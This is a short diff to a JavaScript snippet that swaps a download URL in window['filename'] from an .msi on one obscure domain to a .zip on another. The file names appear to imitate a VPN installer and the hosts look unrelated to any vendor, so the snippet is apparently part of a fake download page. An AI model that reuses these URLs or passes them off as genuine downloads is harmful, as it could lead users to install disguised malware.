@@ -1,3 +1,3 @@
 (function() {
-    window['filename'] = 'http://kl.sxlaowan.top/letsv-latest.msi';
+    window['filename'] = 'https://reowasiu-s3oss.online/Txs_Rwsaletsvpnd15s.zip';
 })();
